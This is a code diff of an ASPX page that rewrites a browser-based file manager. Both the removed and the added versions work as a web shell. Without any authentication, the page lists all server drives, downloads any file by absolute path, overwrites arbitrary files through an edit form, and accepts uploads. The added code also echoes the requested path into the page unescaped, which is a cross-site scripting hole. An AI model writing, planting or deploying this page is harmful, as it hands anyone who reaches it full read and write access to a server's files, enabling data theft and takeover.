@@ -3,144 +3,113 @@
 <%@ Import Namespace="System.Web" %>
 
 <script runat="server">
-string currentDir = Request.QueryString["dir"] ?? "";
-
-// File upload
 protected void Page_Load(object sender, EventArgs e)
 {
-    if (IsPostBack && Request.Files.Count > 0 && !string.IsNullOrEmpty(currentDir))
+    string dir = Request.QueryString["dir"];
+    if (string.IsNullOrEmpty(dir))
     {
-        HttpPostedFile file = Request.Files[0];
-        string savePath = Path.Combine(currentDir, Path.GetFileName(file.FileName));
-        file.SaveAs(savePath);
-        Response.Write("<div class='msg'>File uploaded: " + savePath + "</div>");
-    }
-
-    // Delete
-    string delFile = Request.QueryString["del"];
-    if (!string.IsNullOrEmpty(delFile) && !string.IsNullOrEmpty(currentDir))
-    {
-        string filePath = Path.Combine(currentDir, delFile);
-        if (File.Exists(filePath)) { File.Delete(filePath); Response.Write("<div class='msg'>Deleted file: " + delFile + "</div>"); }
-        else if (Directory.Exists(filePath)) { Directory.Delete(filePath, true); Response.Write("<div class='msg'>Deleted directory: " + delFile + "</div>"); }
-    }
-
-    // File edit/save
-    string editFile = Request.Form["editFile"];
-    string editContent = Request.Form["editContent"];
-    if (!string.IsNullOrEmpty(editFile) && !string.IsNullOrEmpty(currentDir))
-    {
-        File.WriteAllText(Path.Combine(currentDir, editFile), editContent);
-        Response.Write("<div class='msg'>File saved: " + editFile + "</div>");
-    }
-}
-
-// List drives/folders/files
-protected string ListFilesAndDirs()
-{
-    StringWriter sw = new StringWriter();
-    sw.WriteLine("<ul class='file-list'>");
-
-    if (string.IsNullOrEmpty(currentDir))
-    {
-        foreach (var drive in DriveInfo.GetDrives())
-        {
-            if (drive.IsReady)
-                sw.WriteLine($"<li class='dir'>[DRIVE] <a href='?dir={HttpUtility.UrlEncode(drive.RootDirectory.FullName)}'>{drive.Name}</a></li>");
-        }
+        ShowDrives();
     }
     else
     {
-        string parent = Directory.GetParent(currentDir)?.FullName;
-        if (!string.IsNullOrEmpty(parent))
-            sw.WriteLine($"<li class='dir'>[DIR] <a href='?dir={HttpUtility.UrlEncode(parent)}'>.. (Parent)</a></li>");
+        ShowDirectory(dir);
+    }
+}
 
-        foreach (var dir in Directory.GetDirectories(currentDir))
+void ShowDrives()
+{
+    Response.Write("<h2>Drives</h2><ul>");
+    DriveInfo[] drives = DriveInfo.GetDrives();
+    foreach (DriveInfo drive in drives)
+    {
+        if (drive.IsReady)
         {
-            string name = Path.GetFileName(dir);
-            sw.WriteLine($"<li class='dir'>[DIR] <a href='?dir={HttpUtility.UrlEncode(dir)}'>{name}</a> <a class='del' href='?dir={HttpUtility.UrlEncode(currentDir)}&del={HttpUtility.UrlEncode(name)}'>[del]</a></li>");
-        }
-
-        foreach (var file in Directory.GetFiles(currentDir))
-        {
-            string name = Path.GetFileName(file);
-            sw.WriteLine($"<li class='file'>{name} <a class='del' href='?dir={HttpUtility.UrlEncode(currentDir)}&del={HttpUtility.UrlEncode(name)}'>[del]</a> <a class='edit' href='?dir={HttpUtility.UrlEncode(currentDir)}&edit={HttpUtility.UrlEncode(name)}'>[edit]</a> <a class='download' href='?download={HttpUtility.UrlEncode(name)}&dir={HttpUtility.UrlEncode(currentDir)}'>[download]</a></li>");
+            Response.Write("<li class='dir'>[DRIVE] <a href='?dir=" + HttpUtility.UrlEncode(drive.RootDirectory.FullName) + "'>" + drive.Name + "</a></li>");
         }
     }
-
-    sw.WriteLine("</ul>");
-    return sw.ToString();
+    Response.Write("</ul>");
 }
 
-// Read file content
-protected string ReadFile(string f)
+void ShowDirectory(string path)
 {
-    string path = Path.Combine(currentDir, f);
-    if (File.Exists(path)) return File.ReadAllText(path);
-    return "";
-}
+    Response.Write("<h2>Directory: " + path + "</h2>");
+    Response.Write("<a href='?dir=" + HttpUtility.UrlEncode(Path.GetDirectoryName(path)) + "'>.. Parent</a><br/><br/>");
 
-// File download
-protected void Page_PreRender(object sender, EventArgs e)
-{
-    string downloadFile = Request.QueryString["download"];
-    if (!string.IsNullOrEmpty(downloadFile) && !string.IsNullOrEmpty(currentDir))
+    // Folders
+    Response.Write("<ul>");
+    try
     {
-        string path = Path.Combine(currentDir, downloadFile);
-        if (File.Exists(path))
+        string[] dirs = Directory.GetDirectories(path);
+        foreach (string d in dirs)
         {
-            Response.ContentType = "application/octet-stream";
-            Response.AddHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(path));
-            Response.WriteFile(path);
-            Response.End();
+            Response.Write("<li class='dir'><a href='?dir=" + HttpUtility.UrlEncode(d) + "'>" + Path.GetFileName(d) + "</a></li>");
         }
+
+        // Files
+        string[] files = Directory.GetFiles(path);
+        foreach (string f in files)
+        {
+            Response.Write("<li class='file'>" + Path.GetFileName(f) + 
+                " | <a href='?dir=" + HttpUtility.UrlEncode(path) + "&download=" + HttpUtility.UrlEncode(f) + "'>Download</a>" + 
+                " | <a href='?dir=" + HttpUtility.UrlEncode(path) + "&edit=" + HttpUtility.UrlEncode(f) + "'>Edit</a></li>");
+        }
+    }
+    catch (Exception ex)
+    {
+        Response.Write("<li style='color:red;'>Error: " + ex.Message + "</li>");
+    }
+    Response.Write("</ul>");
+
+    // Download file
+    if (!string.IsNullOrEmpty(Request.QueryString["download"]))
+    {
+        string fileToDownload = Request.QueryString["download"];
+        Response.Clear();
+        Response.ContentType = "application/octet-stream";
+        Response.AddHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(fileToDownload));
+        Response.WriteFile(fileToDownload);
+        Response.End();
+    }
+
+    // Edit file
+    if (!string.IsNullOrEmpty(Request.QueryString["edit"]))
+    {
+        string fileToEdit = Request.QueryString["edit"];
+        if (Request.HttpMethod == "POST")
+        {
+            string newContent = Request.Form["content"];
+            File.WriteAllText(fileToEdit, newContent);
+            Response.Write("<p style='color:green;'>File saved!</p>");
+        }
+        string content = File.ReadAllText(fileToEdit);
+        Response.Write("<form method='post'><textarea name='content' rows='20' cols='100'>" + HttpUtility.HtmlEncode(content) + "</textarea><br/><input type='submit' value='Save'></form>");
+    }
+
+    // Upload
+    Response.Write("<h3>Upload File</h3>");
+    Response.Write("<form method='post' enctype='multipart/form-data'>");
+    Response.Write("<input type='file' name='file' /> <input type='submit' value='Upload' />");
+    Response.Write("</form>");
+
+    if (IsPostBack && Request.Files.Count > 0)
+    {
+        HttpPostedFile file = Request.Files[0];
+        string fileName = Path.GetFileName(file.FileName);
+        string savePath = Path.Combine(path, fileName);
+        file.SaveAs(savePath);
+        Response.Write("<p style='color:green;'>File uploaded: " + fileName + "</p>");
     }
 }
 </script>
 
-<html>
-<head>
 <style>
-body { font-family: Arial, sans-serif; background: #f7f7f7; color: #333; padding: 20px;}
-h2 { color: #444; }
-.file-list { list-style: none; padding-left: 0; }
-.file-list li { padding: 5px 0; border-bottom: 1px solid #ddd; }
-.file-list li.dir { font-weight: bold; color: #1a73e8; }
-.file-list li a { text-decoration: none; margin-right: 10px; }
-.file-list li a.del { color: red; }
-.file-list li a.edit { color: green; }
-.file-list li a.download { color: #ff9800; }
-.msg { padding: 5px; background: #e0ffe0; border: 1px solid #0f0; margin-bottom: 10px; }
-textarea { font-family: monospace; }
-input[type="submit"] { padding: 5px 15px; background: #1a73e8; color: #fff; border: none; cursor: pointer; }
-input[type="submit"]:hover { background: #0b5ed7; }
+body { font-family: Arial; background: #f9f9f9; padding: 20px; }
+h2 { color: #333; }
+ul { list-style-type: none; padding-left: 0; }
+li.dir a { font-weight: bold; color: #2a52be; text-decoration: none; }
+li.file { color: #555; }
+textarea { width: 100%; }
 </style>
-</head>
+
 <body>
-<h2>ASPX Full File Manager</h2>
-
-<% if (!string.IsNullOrEmpty(currentDir)) { %>
-<form method="post" enctype="multipart/form-data">
-Upload file: <input type="file" name="file" />
-<input type="submit" value="Upload" />
-</form>
-<hr/>
-<% } %>
-
-<% if (!string.IsNullOrEmpty(Request.QueryString["edit"])) { 
-       string ef = Request.QueryString["edit"];
-%>
-<form method="post">
-Editing: <b><%= ef %></b><br/>
-<textarea name="editContent" style="width:600px;height:300px;"><%= ReadFile(ef) %></textarea><br/>
-<input type="hidden" name="editFile" value="<%= ef %>"/>
-<input type="submit" value="Save"/>
-</form>
-<hr/>
-<% } %>
-
-<h3><%= string.IsNullOrEmpty(currentDir) ? "System Drives" : "Current Directory: " + currentDir %></h3>
-<%= ListFilesAndDirs() %>
-
 </body>
-</html>
